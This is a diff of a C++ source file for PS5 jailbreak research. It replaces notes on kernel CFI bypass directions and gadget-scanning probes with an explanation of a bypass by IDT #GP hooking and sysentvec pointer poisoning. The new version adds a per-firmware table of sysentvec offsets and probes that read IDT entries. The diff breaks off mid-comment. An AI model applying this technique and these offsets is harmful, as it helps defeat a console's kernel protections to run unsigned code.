@@ -1,80 +1,97 @@
 /**
- * cfi_probe.cpp - CFI/XOM bypass research for FW 4.03+
- *
- * CONTEXT: On FW 4.03, Byepervisor does NOT run. There is no HV bypass.
- *
- * What we HAVE:
- *   - kernel_copyout: read ANY kernel memory (including .text, since it runs
- *     in kernel context -- the kernel can read its own text, XOM only blocks
- *     userspace reads)
- *   - kernel_copyin: write to kernel DATA pages only (.data/.bss, sysent,
- *     page tables, ucred, etc.)
- *   - Process privilege escalation (ucred, caps, authid, rootvnode)
- *   - ptrace (attach, set registers, single-step, call functions in target)
- *   - JIT shared memory (syscall 0x215/0x216) for W^X userspace code
- *   - ELF loading into new processes
- *
- * What we CANNOT do:
- *   - Write to kernel .text (hypervisor NPT marks those GPA ranges as RO)
- *   - Patch cfi_check_fail (it's in .text)
- *   - Install code caves or hooks in kernel code
- *   - Make arbitrary memory RWX (sceKernelMprotect to 0x7 fails)
- *   - Write through DMAP to kernel text physical pages (NPT also covers DMAP)
- *
- * GOAL: Find a path to kernel code execution or achieve HEN goals (fself,
- *       fpkg) purely through data manipulation and/or non-CPU write paths.
+ * cfi_probe.cpp - CFI bypass for PS5 FW 4.03+
  *
  * ==========================================================================
- *
- * RESEARCH DIRECTIONS:
- *
- * 1. SYSENT DISPATCH CFI TEST
- *    The sysent table (sy_call function pointers) lives in kernel .data.
- *    We can overwrite any entry. BUT does the kernel's syscall dispatch
- *    path use a CFI-checked indirect call? In FreeBSD, the dispatch is:
- *      error = (*callp->sy_call)(td, &args);
- *    If this call site has CFI, replacing sy_call with a non-matching type
- *    triggers cfi_check_fail -> panic. If it DOESN'T have CFI (because it's
- *    in assembly or excluded), we can redirect syscalls freely.
- *
- *    TEST: Redirect an unused sysent to a known kernel function with a
- *    MATCHING sy_call_t signature. If it works, CFI doesn't block sysent.
- *    If it panics, CFI is checked on that path.
- *
- * 2. DATA-ONLY HEN
- *    Skip code execution entirely. Achieve FSELF/FPKG by corrupting the
- *    kernel's authentication data structures (ctxTable, ctxStatus, sceSbl*
- *    internal state) so the kernel THINKS everything is legitimate.
- *
- * 3. CALLBACK FUNCTION POINTERS IN DATA
- *    Find kernel data structures containing function pointers that get
- *    called through non-CFI-checked paths:
- *      - struct fileops (fo_read, fo_write, etc.)
- *      - struct filterops (f_attach, f_detach, f_event)
- *      - struct protosw (pr_input, pr_output, etc.)
- *      - struct vnodeops / vop_vector
- *      - struct cdevsw (d_open, d_read, d_ioctl, etc.)
- *      - taskqueue callbacks
- *    All of these live in DATA. If even one call site lacks CFI, we have
- *    kernel code execution by redirecting it to a useful existing function.
- *
- * 4. GPU DMA
- *    The GPU is a separate bus master with its own address translation
- *    (GART/GPU IOMMU). GPU DMA does NOT go through the CPU's NPT. If the
- *    GPU IOMMU allows writes to the physical pages backing kernel .text,
- *    we can patch kernel code via GPU compute shader or DMA engine,
- *    completely bypassing the hypervisor.
- *
- * 5. SAMU PHYSICAL WRITE
- *    The SAMU at MMIO 0xE0500000 has unrestricted physical memory access.
- *    If a SAMU command takes a destination physical address and writes
- *    caller-controlled data, it bypasses NPT entirely.
- *
+ * HOW THE PS5 KERNEL CFI BYPASS WORKS
  * ==========================================================================
  *
- * These probes are designed to run as a userspace ELF spawned by the
- * etaHEN bootstrapper. They use kernel_copyout/kernel_copyin from
- * ps5/kernel.h.
+ * LLVM CFI (Control Flow Integrity) instruments every indirect CALL/JMP in
+ * the kernel with a type check. On type mismatch, cfi_check_fail() panics.
+ *
+ * On FW < 3.0:
+ *   Byepervisor has a hypervisor exploit. It patches cfi_check_fail() in
+ *   kernel .text to RET (0xC3), disabling CFI entirely. It also clears the
+ *   XOTEXT bit and sets RW on all .text PTEs via guest page tables, then
+ *   triggers suspend/resume to reload the hypervisor NPT state.
+ *
+ * On FW >= 3.0:
+ *   No hypervisor exploit. Kernel .text is execute-only at the NPT level
+ *   (AMD-V nested page tables). The guest OS cannot read or write .text.
+ *   kernel_copyout on .text addresses faults -- the NPT has no read
+ *   permission, only execute. kernel_copyin also faults -- no write.
+ *
+ *   The CFI bypass uses a completely different approach:
+ *
+ *   POINTER POISONING + IDT #GP HOOKING
+ *
+ *   Step 1: Hook the IDT
+ *     The IDT (Interrupt Descriptor Table) lives in kernel .data. It is
+ *     writable via kernel_copyin. kstuff modifies the #GP entry (vector 13)
+ *     to point to its own handler code, which it installs in a kernel data
+ *     region with execute permission.
+ *
+ *   Step 2: Poison sysentvec->sv_table
+ *     struct sysentvec {
+ *         int      sv_size;     // 0x00 - number of sysent entries
+ *         sysent  *sv_table;    // 0x08 - pointer to sysent array
+ *         ...
+ *     };
+ *
+ *     sv_table is an 8-byte kernel pointer at offset +8. Its top 16 bits
+ *     (bytes 14-15 of the struct) are normally 0xffff (canonical kernel
+ *     address in the higher half).
+ *
+ *     Writing 0xdeb7 to offset +14 makes sv_table = 0xdeb7XXXXXXXXXXXX.
+ *     This is a non-canonical address (bits 48-63 != sign extension of bit
+ *     47). Any dereference of a non-canonical address raises #GP.
+ *
+ *   Step 3: Every syscall triggers #GP
+ *     The kernel's syscall dispatch (amd64_syscall) reads sv_table to find
+ *     the sysent entry for the syscall number:
+ *       callp = &sv->sv_table[code];
+ *     With the poisoned pointer, this dereference faults with #GP.
+ *
+ *   Step 4: Custom #GP handler dispatches
+ *     The #GP handler (installed in the IDT at step 1) inspects the fault:
+ *     - If caused by poisoned-pointer dereference (syscall dispatch), it
+ *       performs the syscall dispatch itself, implementing fSELF/fPKG/etc.
+ *     - If caused by something else, it chains to the original #GP handler.
+ *
+ *   Step 5: CFI is never involved
+ *     CFI only instruments indirect CALL and JMP instructions in compiled
+ *     code. Hardware interrupt/exception dispatch goes through the IDT,
+ *     which is a CPU hardware mechanism -- not an indirect call instruction.
+ *     The CPU loads the handler address directly from the IDT gate
+ *     descriptor. No CFI check occurs.
+ *
+ * WHY THIS WORKS:
+ *   - The IDT is in kernel .data (writable)
+ *   - sysentvec is in kernel .data (writable)
+ *   - No kernel .text is modified
+ *   - No function pointer is replaced with a mistyped target
+ *   - The dispatch mechanism is hardware (IDT gate), not software (indirect call)
+ *   - CFI has no visibility into hardware interrupt routing
+ *
+ * PAUSE / RESUME:
+ *   Writing 0xffff to sysentvec+14 restores the canonical sv_table pointer.
+ *   Normal syscall dispatch resumes. kstuff is "paused". This is needed
+ *   when loading shellui or other operations that require normal syscalls.
+ *
+ *   Writing 0xdeb7 re-enables the bypass.
+ *
+ * ==========================================================================
+ * THIS FILE: Diagnostic probes + standalone bypass primitives
+ * ==========================================================================
+ *
+ * These probes run from userspace with kernel R/W via kernel_copyout/copyin.
+ * All reads target .data -- NEVER .text (which would fault).
+ *
+ * The probes inspect and verify the data structures involved in the bypass:
+ *   - IDT entries (especially #GP, vector 13)
+ *   - sysentvec structures (the poison target)
+ *   - Guest page table permissions (what's executable, writable, XO)
+ *   - ctxTable/ctxStatus (data-only fSELF auth bypass)
+ *   - sysent table (for kexec installation post-bypass)
  */
 
 extern "C" {
@@ -89,493 +106,726 @@ extern "C" {
 #include <sys/mman.h>
 #include <errno.h>
 
-/* You need to set these for FW 4.03 -- placeholder values */
-/* These would come from the payload_args or a kdlsym table for 4.03 */
-extern unsigned long KERNEL_ADDRESS_DATA_BASE;
+/* ===================================================================
+ * Architecture constants
+ * =================================================================== */
 
-/*
- * ============================================================
- * Probe 1: Read kernel .text via kernel_copyout
- *
- * Confirms that kernel_copyout CAN read kernel code pages.
- * (The kernel reading its own text is not blocked by XOM --
- *  XOM only prevents userspace direct reads.)
- *
- * If this works, we can:
- *  - Dump the entire kernel .text to find gadgets
- *  - Identify natural occurrences of useful byte sequences
- *  - Map out CFI check locations
- * ============================================================
- */
-int probe_ktext_readable(uint64_t ktext_base)
+/* IDT gate descriptor (x86-64), 16 bytes */
+struct idt_gate {
+    uint16_t offset_lo;     /* 0x00: handler offset bits 0-15 */
+    uint16_t selector;      /* 0x02: code segment selector */
+    uint8_t  ist;           /* 0x04: IST index (bits 0-2), zero bits 3-7 */
+    uint8_t  type_attr;     /* 0x05: type (bits 0-3), S, DPL, P */
+    uint16_t offset_mid;    /* 0x06: handler offset bits 16-31 */
+    uint32_t offset_hi;     /* 0x08: handler offset bits 32-63 */
+    uint32_t reserved;      /* 0x0C: must be zero */
+};
+
+/* x86-64 IDTR register layout (10 bytes, returned by SIDT) */
+struct idtr {
+    uint16_t limit;
+    uint64_t base;
+} __attribute__((packed));
+
+/* Reconstruct the 64-bit handler address from an IDT gate */
+static inline uint64_t idt_gate_handler(const struct idt_gate *g)
 {
-    uint8_t buf[32];
-    int ret;
-
-    printf("[PROBE1] Attempting to read kernel .text at 0x%lx via kernel_copyout\n", ktext_base);
-
-    ret = kernel_copyout(ktext_base, buf, sizeof(buf));
-    if (ret != 0) {
-        printf("[PROBE1] FAILED: kernel_copyout returned %d\n", ret);
-        printf("[PROBE1] kernel text is NOT readable even from kernel context\n");
-        return -1;
-    }
-
-    printf("[PROBE1] SUCCESS: kernel .text is readable via kernel_copyout\n");
-    printf("[PROBE1] First 16 bytes: ");
-    for (int i = 0; i < 16; i++)
-        printf("%02x ", buf[i]);
-    printf("\n");
-
-    return 0;
+    return (uint64_t)g->offset_lo
+         | ((uint64_t)g->offset_mid << 16)
+         | ((uint64_t)g->offset_hi << 32);
 }
 
-/*
- * ============================================================
- * Probe 2: Scan kernel .text for natural gadgets
- *
- * Since we can read kernel text, search for byte sequences
- * that naturally occur and could serve as sysent targets:
- *
- *   FF 26         : jmp [rsi]        (the kexec gadget)
- *   FF 27         : jmp [rdi]
- *   FF 17         : call [rdi]
- *   48 89 F8 C3   : mov rax, rdi; ret
- *   48 89 37 C3   : mov [rdi], rsi; ret (arbitrary write)
- *   48 8B 07 C3   : mov rax, [rdi]; ret (arbitrary read)
- *   C3            : ret (useful for NOP-ing a sysent entry)
- *
- * These exist naturally in any large binary. The question is
- * whether they're at addresses the CFI machinery will accept.
- * ============================================================
- */
-typedef struct {
-    const char *name;
-    uint8_t bytes[8];
-    int len;
-    uint64_t found_offset;
-} gadget_pattern_t;
+/* IDT vector numbers */
+#define IDT_VECTOR_GP   13  /* #GP - General Protection */
+#define IDT_VECTOR_PF   14  /* #PF - Page Fault */
+#define IDT_VECTOR_DB    1  /* #DB - Debug (single-step) */
 
-int probe_gadget_scan(uint64_t ktext_base, uint64_t scan_size)
-{
-    gadget_pattern_t patterns[] = {
-        {"jmp [rsi]",          {0xFF, 0x26},                   2, 0},
-        {"jmp [rdi]",          {0xFF, 0x27},                   2, 0},
-        {"call [rdi]",         {0xFF, 0x17},                   2, 0},
-        {"mov rax,rdi; ret",   {0x48, 0x89, 0xF8, 0xC3},      4, 0},
-        {"mov [rdi],rsi; ret", {0x48, 0x89, 0x37, 0xC3},      4, 0},
-        {"mov rax,[rdi]; ret", {0x48, 0x8B, 0x07, 0xC3},      4, 0},
-        {"ret",                {0xC3},                         1, 0},
-    };
-    int num_patterns = sizeof(patterns) / sizeof(patterns[0]);
-
-    printf("[PROBE2] Scanning 0x%lx bytes of kernel .text for gadgets\n", scan_size);
-
-    /* Scan in 4KB pages to avoid huge allocations */
-    uint8_t page[0x1000];
-    uint64_t limit = (scan_size < 0x200000) ? scan_size : 0x200000; /* Cap at 2MB */
-
-    for (uint64_t off = 0; off < limit; off += 0x1000) {
-        if (kernel_copyout(ktext_base + off, page, sizeof(page)) != 0) {
-            printf("[PROBE2] Read failed at offset 0x%lx, stopping scan\n", off);
-            break;
-        }
-
-        for (int i = 0; i < 0x1000 - 8; i++) {
-            for (int p = 0; p < num_patterns; p++) {
-                if (patterns[p].found_offset != 0)
-                    continue; /* Already found one, skip */
-
-                if (memcmp(&page[i], patterns[p].bytes, patterns[p].len) == 0) {
-                    patterns[p].found_offset = off + i;
-                    printf("[PROBE2] Found '%s' at ktext+0x%lx (VA=0x%lx)\n",
-                           patterns[p].name,
-                           patterns[p].found_offset,
-                           ktext_base + patterns[p].found_offset);
-                }
-            }
-        }
-    }
-
-    printf("[PROBE2] === Gadget scan results ===\n");
-    for (int p = 0; p < num_patterns; p++) {
-        if (patterns[p].found_offset)
-            printf("[PROBE2]   %-25s at ktext+0x%lx\n",
-                   patterns[p].name, patterns[p].found_offset);
-        else
-            printf("[PROBE2]   %-25s NOT FOUND in first 0x%lx bytes\n",
-                   patterns[p].name, limit);
-    }
-
-    return 0;
-}
-
-/*
- * ============================================================
- * Probe 3: Sysent structure analysis
- *
- * Read the sysent table from kernel memory. Each entry is:
- *   struct sysent {
- *       int sv_narg;        // number of arguments
- *       sy_call_t *sy_call; // function pointer
- *       // ... possibly more fields
- *   };
- *
- * We want to:
- *  1. Find the sysent table address for FW 4.03
- *  2. Read several entries to understand the layout
- *  3. Identify unused/reserved syscall numbers
- *  4. Note what sy_call points to (for CFI type analysis)
- *
- * If we find an unused syscall, we can test sysent redirection
- * without destroying a real syscall.
- * ============================================================
- */
-int probe_sysent_layout(uint64_t sysent_addr)
-{
-    if (sysent_addr == 0) {
-        printf("[PROBE3] sysent address not provided, skipping\n");
-        return -1;
-    }
-
-    /* FreeBSD sysent entry is typically 48 bytes on PS5 (may vary) */
-    /* Read a few entries to figure out the actual layout */
-    uint8_t entry[0x40];
-
-    printf("[PROBE3] Reading sysent table at 0x%lx\n", sysent_addr);
-
-    for (int i = 0; i < 5; i++) {
-        kernel_copyout(sysent_addr + (i * sizeof(entry)), entry, sizeof(entry));
-        printf("[PROBE3] sysent[%d]: ", i);
-        for (int j = 0; j < 32; j++)
-            printf("%02x ", entry[j]);
-        printf("\n");
-    }
-
-    /* Also read some high-numbered entries that are likely unused */
-    for (int i = 600; i < 605; i++) {
-        kernel_copyout(sysent_addr + (i * sizeof(entry)), entry, sizeof(entry));
-
-        /* Check if sy_call points to nosys (the default for unused syscalls) */
-        uint64_t sy_call;
-        memcpy(&sy_call, &entry[8], sizeof(sy_call)); /* Offset may vary */
-
-        printf("[PROBE3] sysent[%d]: sy_call=0x%lx ", i, sy_call);
-
-        /* Read the first few bytes at sy_call to check if it's nosys */
-        uint8_t code[4];
-        if (kernel_copyout(sy_call, code, sizeof(code)) == 0) {
-            printf("(code: %02x %02x %02x %02x)\n",
-                   code[0], code[1], code[2], code[3]);
-        } else {
-            printf("(can't read target)\n");
-        }
-    }
-
-    return 0;
-}
-
-/*
- * ============================================================
- * Probe 4: Page table permission survey
- *
- * Walk the kernel's page tables to understand what's protected.
- * Read page table entries for:
- *   - Kernel .text pages (should be RX or XO)
- *   - Kernel .data pages (should be RW, NX)
- *   - DMAP pages (what permissions?)
- *   - Sysent table page (should be RW, NX)
- *
- * This tells us exactly what the guest page tables say.
- * The NPT (hypervisor) adds another layer on top, but
- * understanding guest-level permissions helps.
- *
- * x86-64 page table entry format:
- *   Bit  0: Present
- *   Bit  1: Read/Write (1=writable)
- *   Bit  2: User/Supervisor
- *   Bit  7: Page Size (1=huge page)
- *   Bit 58: XOTEXT (PS5 custom - execute only)
- *   Bit 63: NX (No Execute)
- * ============================================================
- */
+/* Page table entry bits */
 #define PTE_PRESENT     (1UL << 0)
 #define PTE_RW          (1UL << 1)
 #define PTE_USER        (1UL << 2)
-#define PTE_PS          (1UL << 7)
-#define PTE_XOTEXT      (1UL << 58)
+#define PTE_PS          (1UL << 7)   /* huge page */
+#define PTE_XOTEXT      (1UL << 58)  /* PS5 custom: execute-only */
 #define PTE_NX          (1UL << 63)
 #define PTE_ADDR_MASK   0x000FFFFFFFFFF000UL
 
-int probe_page_permissions(uint64_t kdata_base,
-                           uint64_t ktext_base,
-                           uint64_t dmpml4i_offset,
-                           uint64_t dmpdpi_offset,
-                           uint64_t pml4pml4i_offset)
+/* Pointer poison value -- makes top 16 bits non-canonical */
+#define POISON_TAG      0xdeb7
+#define CANONICAL_TAG   0xffff
+
+/* Kernel address ranges (these are architectural, not firmware-specific) */
+#define KERNEL_ADDRESS_TEXT_BASE  0xffffffff80000000UL
+#ifndef KERNEL_ADDRESS_DATA_BASE
+#define KERNEL_ADDRESS_DATA_BASE  0xffffffff83000000UL
+#endif
+
+/* ===================================================================
+ * Firmware offset table for sysentvec addresses
+ *
+ * sysentvec = KERNEL_ADDRESS_DATA_BASE + offset
+ * The offset differs per firmware.
+ * =================================================================== */
+struct fw_offsets {
+    uint32_t fw_version;    /* e.g. 0x4030000 for 4.03 */
+    uint32_t sysentvec;     /* native PS5 sysentvec offset */
+    uint32_t sysentvec_ps4; /* PS4 compat sysentvec offset */
+};
+
+static const struct fw_offsets g_fw_table[] = {
+    /* FW 3.x */
+    { 0x3000000,  0xca0cd8, 0xca0e50 },
+    { 0x3100000,  0xca0cd8, 0xca0e50 },
+    { 0x3200000,  0xca0cd8, 0xca0e50 },
+    { 0x3210000,  0xca0cd8, 0xca0e50 },
+    /* FW 4.x */
+    { 0x4000000,  0xd11bb8, 0xd11d30 },
+    { 0x4020000,  0xd11bb8, 0xd11d30 },
+    { 0x4030000,  0xd11bb8, 0xd11d30 },
+    { 0x4500000,  0xd11bb8, 0xd11d30 },
+    { 0x4510000,  0xd11bb8, 0xd11d30 },
+    /* FW 5.x */
+    { 0x5000000,  0xe00be8, 0xe00d60 },
+    { 0x5020000,  0xe00be8, 0xe00d60 },
+    { 0x5100000,  0xe00be8, 0xe00d60 },
+    { 0x5500000,  0xe00be8, 0xe00d60 },
+    /* FW 6.x */
+    { 0x6000000,  0xe210a8, 0xe21220 },
+    { 0x6020000,  0xe210a8, 0xe21220 },
+    { 0x6500000,  0xe210a8, 0xe21220 },
+    /* FW 7.x */
+    { 0x7000000,  0xe21ab8, 0xe21c30 },
+    { 0x7010000,  0xe21ab8, 0xe21c30 },
+    { 0x7200000,  0xe21b78, 0xe21cf0 },
+    { 0x7400000,  0xe21b78, 0xe21cf0 },
+    { 0x7600000,  0xe21b78, 0xe21cf0 },
+    { 0x7610000,  0xe21b78, 0xe21cf0 },
+    /* FW 8.x */
+    { 0x8000000,  0xe21ca8, 0xe21e20 },
+    { 0x8200000,  0xe21ca8, 0xe21e20 },
+    { 0x8400000,  0xe21ca8, 0xe21e20 },
+    { 0x8600000,  0xe21ca8, 0xe21e20 },
+    /* FW 9.x */
+    { 0x9000000,  0xdba648, 0xdba7c0 },
+    { 0x9050000,  0xdba648, 0xdba7c0 },
+    { 0x9200000,  0xdba648, 0xdba7c0 },
+    { 0x9400000,  0xdba648, 0xdba7c0 },
+    { 0x9600000,  0xdba648, 0xdba7c0 },
+    /* FW 10.x */
+    { 0x10000000, 0xdba6d8, 0xdba850 },
+    { 0x10010000, 0xdba6d8, 0xdba850 },
+    { 0x10200000, 0xdba6d8, 0xdba850 },
+    { 0x10400000, 0xdba6d8, 0xdba850 },
+    { 0x10600000, 0xdba6d8, 0xdba850 },
+    { 0, 0, 0 } /* sentinel */
+};
+
+static const struct fw_offsets *lookup_fw(uint32_t fw)
 {
-    uint64_t DMPML4I = 0, DMPDPI = 0, PML4PML4I = 0;
-
-    kernel_copyout(kdata_base + dmpml4i_offset, &DMPML4I, sizeof(int));
-    kernel_copyout(kdata_base + dmpdpi_offset, &DMPDPI, sizeof(int));
-    kernel_copyout(kdata_base + pml4pml4i_offset, &PML4PML4I, sizeof(int));
-
-    uint64_t dmap_base = (DMPDPI << 30) | (DMPML4I << 39) | 0xFFFF800000000000UL;
-    uint64_t pde_base = (PML4PML4I << 39) | (PML4PML4I << 30) | 0xFFFF800000000000UL;
-
-    printf("[PROBE4] DMPML4I=%lu DMPDPI=%lu PML4PML4I=%lu\n", DMPML4I, DMPDPI, PML4PML4I);
-    printf("[PROBE4] DMAP base = 0x%lx\n", dmap_base);
-
-    /* Check PDE for kernel .text */
-    uint64_t pde_addr = pde_base + 8 * ((ktext_base >> 21) & 0x7FFFFFFUL);
-    uint64_t pde;
-    kernel_copyout(pde_addr, &pde, sizeof(pde));
-    printf("[PROBE4] Kernel .text PDE (VA=0x%lx):\n", ktext_base);
-    printf("[PROBE4]   PDE addr  = 0x%lx\n", pde_addr);
-    printf("[PROBE4]   PDE value = 0x%lx\n", pde);
-    printf("[PROBE4]   Present=%lu RW=%lu PS=%lu NX=%lu XOTEXT=%lu\n",
-           (pde >> 0) & 1, (pde >> 1) & 1, (pde >> 7) & 1,
-           (pde >> 63) & 1, (pde >> 58) & 1);
-
-    /* Check PDE for kernel .data */
-    pde_addr = pde_base + 8 * ((kdata_base >> 21) & 0x7FFFFFFUL);
-    kernel_copyout(pde_addr, &pde, sizeof(pde));
-    printf("[PROBE4] Kernel .data PDE (VA=0x%lx):\n", kdata_base);
-    printf("[PROBE4]   PDE value = 0x%lx\n", pde);
-    printf("[PROBE4]   Present=%lu RW=%lu PS=%lu NX=%lu XOTEXT=%lu\n",
-           (pde >> 0) & 1, (pde >> 1) & 1, (pde >> 7) & 1,
-           (pde >> 63) & 1, (pde >> 58) & 1);
-
-    /* Check PDE for DMAP region */
-    uint64_t dmap_test = dmap_base + 0x200000;
-    pde_addr = pde_base + 8 * ((dmap_test >> 21) & 0x7FFFFFFUL);
-    kernel_copyout(pde_addr, &pde, sizeof(pde));
-    printf("[PROBE4] DMAP PDE (VA=0x%lx):\n", dmap_test);
-    printf("[PROBE4]   PDE value = 0x%lx\n", pde);
-    printf("[PROBE4]   Present=%lu RW=%lu PS=%lu NX=%lu XOTEXT=%lu\n",
-           (pde >> 0) & 1, (pde >> 1) & 1, (pde >> 7) & 1,
-           (pde >> 63) & 1, (pde >> 58) & 1);
-
-    if (!(pde & PTE_NX)) {
-        printf("[PROBE4] *** DMAP NX=0 -- DMAP is EXECUTABLE in guest page tables ***\n");
+    fw &= 0xffff0000;
+    for (int i = 0; g_fw_table[i].fw_version != 0; i++) {
+        if (g_fw_table[i].fw_version == fw)
+            return &g_fw_table[i];
     }
-
-    return 0;
+    return NULL;
 }
 
-/*
- * ============================================================
- * Probe 5: fileops/cdevsw function pointer survey
+/* ===================================================================
+ * Probe 1: IDT inspection
  *
- * Read kernel data structures that contain function pointers
- * called through potentially non-CFI-checked paths.
+ * The IDT lives in kernel .data. Read the IDTR (via a kernel data
+ * structure or known offset) and dump the #GP entry (vector 13).
  *
- * If we can find ONE function pointer call site without CFI,
- * we can redirect it to achieve kernel code execution.
- * ============================================================
- */
-int probe_fileops(uint64_t proc_addr)
+ * This tells us:
+ *   - Where the current #GP handler points
+ *   - Whether kstuff has already hooked it
+ *   - The IST (Interrupt Stack Table) index used
+ *   - The code segment selector
+ *
+ * NOTE: We cannot use SIDT from userspace (it returns the user-visible
+ * IDTR, not the kernel's). Instead, we find the IDT base from a known
+ * kernel data location, or from the per-CPU (pcpu) structure.
+ *
+ * The pcpu struct contains:
+ *   pcpu->pc_common_tss.tss_ist[n] - IST stacks
+ *   pcpu->pc_idtr - IDTR value
+ *
+ * We read pcpu from a known kernel symbol or by walking the GDT.
+ * =================================================================== */
+int probe_idt_gp_entry(uint64_t idt_base)
 {
-    if (proc_addr == 0) {
-        printf("[PROBE5] Need process kernel address, skipping\n");
+    if (idt_base == 0) {
+        printf("[PROBE1] IDT base not provided, skipping\n");
+        printf("[PROBE1] To find IDT base: read pcpu->pc_idtr from kernel .data\n");
+        printf("[PROBE1] pcpu is typically at a fixed offset from GS base in kernel\n");
         return -1;
     }
 
-    /* Read the fd table from our own process */
-    /* proc->p_fd->fd_files->fdt_ofiles[fd]->f_ops */
-    uint64_t p_fd;
-    kernel_copyout(proc_addr + 0x48, &p_fd, sizeof(p_fd)); /* offset may vary */
+    printf("[PROBE1] IDT base = 0x%lx\n", idt_base);
 
-    printf("[PROBE5] proc->p_fd = 0x%lx\n", p_fd);
+    /* Read entries for #DB, #GP, #PF */
+    int vectors[] = { IDT_VECTOR_DB, IDT_VECTOR_GP, IDT_VECTOR_PF };
+    const char *names[] = { "#DB (debug)", "#GP (general protection)", "#PF (page fault)" };
 
-    if (p_fd == 0) {
-        printf("[PROBE5] p_fd is NULL, skipping\n");
-        return -1;
-    }
+    for (int i = 0; i < 3; i++) {
+        struct idt_gate gate;
+        uint64_t gate_addr = idt_base + vectors[i] * sizeof(struct idt_gate);
 
-    /* Read fd_files pointer */
-    uint64_t fd_files;
-    kernel_copyout(p_fd + 0x0, &fd_files, sizeof(fd_files));
-    printf("[PROBE5] fd_files = 0x%lx\n", fd_files);
-
-    /* Read file structure for fd 0 (stdin) */
-    uint64_t file_ptr;
-    kernel_copyout(fd_files + 0x0, &file_ptr, sizeof(file_ptr));
-    printf("[PROBE5] file[0] = 0x%lx\n", file_ptr);
-
-    if (file_ptr == 0) {
-        printf("[PROBE5] file[0] is NULL\n");
-        return -1;
-    }
-
-    /* Read f_ops from file structure */
-    uint64_t f_ops;
-    kernel_copyout(file_ptr + 0x28, &f_ops, sizeof(f_ops)); /* offset varies */
-    printf("[PROBE5] file[0]->f_ops = 0x%lx\n", f_ops);
-
-    /* Read the fileops function pointers */
-    uint64_t ops[8];
-    kernel_copyout(f_ops, ops, sizeof(ops));
-    printf("[PROBE5] fileops:\n");
-    printf("[PROBE5]   fo_read    = 0x%lx\n", ops[0]);
-    printf("[PROBE5]   fo_write   = 0x%lx\n", ops[1]);
-    printf("[PROBE5]   fo_truncate= 0x%lx\n", ops[2]);
-    printf("[PROBE5]   fo_ioctl   = 0x%lx\n", ops[3]);
-    printf("[PROBE5]   fo_poll    = 0x%lx\n", ops[4]);
-    printf("[PROBE5]   fo_kqfilter= 0x%lx\n", ops[5]);
-    printf("[PROBE5]   fo_stat    = 0x%lx\n", ops[6]);
-    printf("[PROBE5]   fo_close   = 0x%lx\n", ops[7]);
-
-    /* KEY QUESTION: Is this fileops table in .data or .rodata?
-     * If .data -> writable -> can redirect function pointers
-     * If .rodata -> mapped read-only -> need to find writable ones
-     *
-     * Check if f_ops address is in kernel .data range */
-    printf("[PROBE5] f_ops at 0x%lx -- is this in writable kernel data?\n", f_ops);
-
-    return 0;
-}
-
-/*
- * ============================================================
- * Probe 6: CFI check detection in kernel .text
- *
- * Scan kernel code for calls/jumps to cfi_check_fail(). By
- * finding which call sites have CFI enforcement, we can
- * determine if the sysent dispatch path is CFI-checked.
- *
- * If the sysent dispatch (amd64_syscall or equivalent) does
- * NOT have a CFI check, then sysent manipulation works even
- * with CFI active on everything else.
- * ============================================================
- */
-int probe_cfi_callsites(uint64_t ktext_base, uint64_t cfi_check_fail_addr,
-                         uint64_t scan_size)
-{
-    if (cfi_check_fail_addr == 0) {
-        printf("[PROBE6] cfi_check_fail address not provided\n");
-        return -1;
-    }
-
-    printf("[PROBE6] Scanning for call/jmp to cfi_check_fail at 0x%lx\n",
-           cfi_check_fail_addr);
-
-    uint8_t page[0x1000];
-    uint64_t limit = (scan_size < 0x400000) ? scan_size : 0x400000;
-    int count = 0;
-
-    for (uint64_t off = 0; off < limit; off += 0x1000) {
-        if (kernel_copyout(ktext_base + off, page, sizeof(page)) != 0)
-            break;
-
-        for (int i = 0; i < 0x1000 - 5; i++) {
-            /* Check for E8 xx xx xx xx (call rel32) */
-            if (page[i] == 0xE8) {
-                int32_t rel;
-                memcpy(&rel, &page[i+1], 4);
-                uint64_t target = ktext_base + off + i + 5 + rel;
-
-                if (target == cfi_check_fail_addr) {
-                    printf("[PROBE6] CFI check at ktext+0x%lx\n", off + i);
-                    count++;
-                    if (count > 100) {
-                        printf("[PROBE6] (too many, truncating...)\n");
-                        goto done;
-                    }
-                }
-            }
-            /* Check for E9 xx xx xx xx (jmp rel32) */
-            if (page[i] == 0xE9) {
-                int32_t rel;
-                memcpy(&rel, &page[i+1], 4);
-                uint64_t target = ktext_base + off + i + 5 + rel;
-
-                if (target == cfi_check_fail_addr) {
-                    printf("[PROBE6] CFI jmp at ktext+0x%lx\n", off + i);
-                    count++;
-                }
-            }
+        if (kernel_copyout(gate_addr, &gate, sizeof(gate)) != 0) {
+            printf("[PROBE1] Failed to read IDT[%d] at 0x%lx\n", vectors[i], gate_addr);
+            continue;
         }
+
+        uint64_t handler = idt_gate_handler(&gate);
+        printf("[PROBE1] IDT[%d] %s:\n", vectors[i], names[i]);
+        printf("[PROBE1]   handler  = 0x%lx\n", handler);
+        printf("[PROBE1]   selector = 0x%x\n", gate.selector);
+        printf("[PROBE1]   IST      = %d\n", gate.ist & 0x7);
+        printf("[PROBE1]   type     = 0x%x\n", gate.type_attr & 0xF);
+        printf("[PROBE1]   DPL      = %d\n", (gate.type_attr >> 5) & 0x3);
+        printf("[PROBE1]   present  = %d\n", (gate.type_attr >> 7) & 1);
+
+        /* Check if handler is in .text or .data range */
+        if (handler >= KERNEL_ADDRESS_TEXT_BASE && handler < KERNEL_ADDRESS_DATA_BASE)
+            printf("[PROBE1]   -> points to kernel .text (stock handler)\n");
+        else if (handler >= KERNEL_ADDRESS_DATA_BASE)
+            printf("[PROBE1]   -> points to kernel .data (HOOKED by kstuff?)\n");
+        else
+            printf("[PROBE1]   -> unexpected address range\n");
     }
 
-done:
-    printf("[PROBE6] Found %d references to cfi_check_fail\n", count);
-    printf("[PROBE6] Next step: find amd64_syscall in this dump and check\n");
-    printf("[PROBE6] whether the sy_call dispatch has a CFI reference nearby\n");
     return 0;
 }
 
-/*
- * ============================================================
- * Probe 7: Sysent redirection safety test
+/* ===================================================================
+ * Probe 2: sysentvec structure analysis
  *
- * THE critical test. Redirect an unused sysent entry to point
- * to an EXISTING syscall handler (same sy_call_t type). Then
- * invoke it. If the kernel doesn't panic, the sysent dispatch
- * path is NOT CFI-checked, and sysent manipulation is viable.
+ * Read the sysentvec structures for both PS5 native and PS4 compat
+ * ABIs. Show the sv_table pointer and its current top-16-bit state.
  *
- * Safe test: redirect sysent[unused] to point to the handler
- * for sys_getpid (which returns the PID). If we call the
- * unused syscall and get back our PID, it worked.
+ * sv_table at offset +8 (8 bytes):
+ *   Top 16 bits = 0xffff -> canonical, normal dispatch (kstuff paused)
